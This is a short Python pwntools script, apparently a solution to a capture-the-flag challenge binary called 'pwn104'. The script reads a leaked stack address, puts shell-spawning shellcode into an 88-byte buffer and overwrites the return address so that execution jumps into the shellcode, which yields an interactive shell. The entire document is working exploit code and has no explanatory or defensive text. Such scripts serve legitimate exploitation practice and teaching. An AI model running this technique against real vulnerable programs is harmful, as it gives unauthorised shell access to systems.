from pwn import *

elf = context.binary = ELF("./pwn104")
p = process()

p.recvuntil(b"at ")
stack_leak = int(p.recvline(), 16)
log.success(f"Leaked stack address at: {hex(stack_leak)}")

sc = asm(shellcraft.sh())
offset = b"A" * (88 - len(sc))

payload = sc
payload += offset
payload += p64(stack_leak)

p.sendline(payload)
p.interactive()
